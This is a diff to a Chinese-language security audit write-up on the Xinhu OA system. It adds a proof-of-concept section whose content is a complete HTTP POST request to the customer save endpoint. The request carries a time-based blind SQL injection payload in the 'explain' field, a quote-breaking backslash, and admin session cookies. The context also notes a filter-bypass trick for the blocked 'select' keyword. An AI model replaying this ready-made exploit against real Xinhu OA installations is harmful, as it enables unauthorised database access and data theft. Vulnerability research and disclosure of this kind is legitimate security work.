@@ -124,6 +124,34 @@ explain=,`explain`=(select(if(1=1,(benchmark(10000000,SHA1(111))),2)=1))%20--%20
 
 成功盲注
 
+## POC
+
+```
+POST /index.php?a=save&m=mode_customer|input&d=flow&ajaxbool=true&rnd=131480 HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 368
+sec-ch-ua: "Chromium";v="119", "Not?A_Brand";v="24"
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
+sec-ch-ua-platform: "Windows"
+Origin: http://127.0.0.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://127.0.0.1/?a=lu&m=input&d=flow&num=customer&mid=0&callback=opegs1733901100171_7188
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: deviceid=1733896888157; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; PHPSESSID=0gjig9u51nhbp8m7cijt12e520; xinhu_mo_adminid=dv0cj0xxb0cx0xjx0dm0mu0xxd0vj0xll0mj0xju0md0mx0mw0cd012; xinhu_ca_adminpass=lw0lx0li0hhj0wx0lx0ei0hio0xx0hoj0xx0el06
+Connection: close
+
+id=0&sxuanfileid=&name=11&laiyuan=%E7%94%B5%E8%AF%9D%E5%BC%80%E6%8B%93&unitname=&type=%E4%BA%92%E8%81%94%E7%BD%91&linkname=a3\&email=&tel=&mobile=&sheng=&shi=&address=&addresslatlng=&shibieid=&openbank=&cardid=&routeline=&explain=,`explain`=(select(if(1=1,(benchmark(10000000,SHA1(111))),2)=1))%20--%20&fileid=&status=1&isstat=0&isgys=0&sysmodeid=7&sysmodenum=customer
+```
+
+
+
 # 补充
 
 测试过程中发现黑名单，可以直接去源码中搜被过滤的字符串从而找到黑名单;加逗号是因为php数组以逗号隔开元素
@@ -135,3 +163,4 @@ select被过滤 -> select,
 ![image-20241211150215134](信呼oa审计/image-20241211150215134.png)
 
 ![image-20241211150258765](信呼oa审计/image-20241211150258765.png)
+
